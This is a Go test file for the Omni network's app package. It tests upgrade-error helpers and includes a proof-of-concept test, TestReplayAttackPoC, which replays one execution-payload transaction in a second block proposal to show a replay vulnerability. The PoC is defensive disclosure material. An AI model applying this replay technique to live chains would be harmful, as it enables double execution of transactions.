//nolint:forbidigo,govet,staticcheck // We use cosmos errors explicitly.
package app

import (
	"fmt"
	"io"
    "context"
    "testing"

    "github.com/cometbft/cometbft/abci/types"
    cmttypes "github.com/cometbft/cometbft/proto/tendermint/types"
    "github.com/cosmos/cosmos-sdk/baseapp"
    sdktestutil "github.com/cosmos/cosmos-sdk/testutil"
    authtypes "github.com/cosmos/cosmos-sdk/x/auth/types"
    storetypes "cosmossdk.io/store/types"
    etypes "github.com/omni-network/omni/octane/evmengine/types"
    "github.com/omni-network/omni/lib/netconf"
    "github.com/stretchr/testify/require"
	"github.com/omni-network/omni/lib/errors"
	"cosmossdk.io/x/upgrade"
	utypes "cosmossdk.io/x/upgrade/types"
	//"github.com/stretchr/testify/require"
)

func TestIsErrOldBinary(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name    string
		err     error
		want    bool
		upgrade string
	}{
		{
			name: "nil error",
			err:  nil,
			want: false,
		},
		{
			name: "eof error",
			err:  io.EOF,
			want: false,
		},
		{
			name:    "wrong version error",
			err:     fmt.Errorf("wrong app version %d, upgrade handler is missing for %s upgrade plan", 99, "test"),
			want:    true,
			upgrade: "test",
		},
		{
			name: "wrapped wrong version error",
			err: errors.Wrap(
				fmt.Errorf("wrong app version %d, upgrade handler is missing for %s upgrade plan", 98, "genesis upgrade"),
				"wrapper"),
			want:    true,
			upgrade: "genesis upgrade",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			upgrade, ok := isErrOldBinary(tt.err)
			require.Equal(t, tt.want, ok)
			require.Equal(t, tt.upgrade, upgrade)
		})
	}
}

func TestIsErrUpgradeNeeded(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name    string
		err     error
		want    bool
		upgrade string
	}{
		{
			name: "nil error",
			err:  nil,
		},
		{
			name: "eof error",
			err:  io.EOF,
		},
		{
			name:    "wrong version error",
			err:     fmt.Errorf(upgrade.BuildUpgradeNeededMsg(utypes.Plan{Name: "1_uluwatu", Height: 1, Info: "genesis upgrade"})),
			want:    true,
			upgrade: "1_uluwatu",
		},
		{
			name: "wrapped wrong version error",
			err: errors.Wrap(
				fmt.Errorf(upgrade.BuildUpgradeNeededMsg(utypes.Plan{Name: "1_uluwatu", Height: 1, Info: "genesis upgrade"})),
				"wrapper"),
			want:    true,
			upgrade: "1_uluwatu",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			upgrade, ok := isErrUpgradeNeeded(tt.err)
			require.Equal(t, tt.want, ok)
			require.Equal(t, tt.upgrade, upgrade)
		})
	}
}
type mockReplayServer struct {
    payload int
}

func (s *mockReplayServer) ExecutionPayload(_ context.Context, _ *etypes.MsgExecutionPayload) (*etypes.ExecutionPayloadResponse, error) {
    s.payload++
    return &etypes.ExecutionPayloadResponse{}, nil
}

func TestReplayAttackPoC(t *testing.T) {
	t.Parallel()

	// Setup test context and dependencies
	authority := authtypes.NewModuleAddress("test").String()
	key := storetypes.NewKVStoreKey("test")
	ctx := sdktestutil.DefaultContext(key, storetypes.NewTransientStoreKey("test_key"))

	// Initialize encoding configuration and transaction config
	encCfg, err := ClientEncodingConfig(ctx, netconf.Devnet)
	require.NoError(t, err)
	txConfig := encCfg.TxConfig

	// Setup message service router
	router := baseapp.NewMsgServiceRouter()
	router.SetInterfaceRegistry(encCfg.InterfaceRegistry)
	srv := &mockReplayServer{}
	etypes.RegisterMsgServiceServer(router, srv)

	// Create process proposal handler
	handler := makeProcessProposalHandler(router, txConfig)

	// Create a valid transaction with one MsgExecutionPayload
	msg := &etypes.MsgExecutionPayload{Authority: authority}
	b := txConfig.NewTxBuilder()
	err = b.SetMsgs(msg)
	require.NoError(t, err)
	tx, err := txConfig.TxEncoder()(b.GetTx())
	require.NoError(t, err)

	// Define a proposal with sufficient quorum
	votes := []types.VoteInfo{
		{Validator: types.Validator{Power: 60}, BlockIdFlag: cmttypes.BlockIDFlagCommit},
		{Validator: types.Validator{Power: 30}, BlockIdFlag: cmttypes.BlockIDFlagCommit},
		{Validator: types.Validator{Power: 10}, BlockIdFlag: cmttypes.BlockIDFlagAbsent},
	} // votedPower=90, totalPower=100, 90 >= 100*2/3=66.67

	// First proposal: Process the transaction normally
	req1 := &types.RequestProcessProposal{
		Height: 100,
		Txs:    [][]byte{tx},
		ProposedLastCommit: types.CommitInfo{
			Votes: votes,
		},
	}

	res1, err := handler(ctx, req1)
	require.NoError(t, err)
	require.Equal(t, types.ResponseProcessProposal_ACCEPT, res1.Status, "first proposal should be accepted")
	require.Equal(t, 1, srv.payload, "mock server should have processed one payload")

	// Second proposal: Replay the same transaction
	req2 := &types.RequestProcessProposal{
		Height: 101, // Different height to simulate a new block
		Txs:    [][]byte{tx}, // Same transaction
		ProposedLastCommit: types.CommitInfo{
			Votes: votes, // Same quorum
		},
	}

	res2, err := handler(ctx, req2)
	require.NoError(t, err)

	// Check for vulnerability: If the replayed transaction is accepted and processed, the bug exists
	if res2.Status == types.ResponseProcessProposal_ACCEPT {
		require.Equal(t, 2, srv.payload, "mock server processed the same payload twice, confirming replay attack vulnerability")
		t.Log("Replay attack PoC successful: System accepted and processed the same XMsg twice")
	} else {
		t.Fatal("Replay attack PoC inconclusive: Second proposal was rejected, but expected acceptance for vulnerability")
	}
}
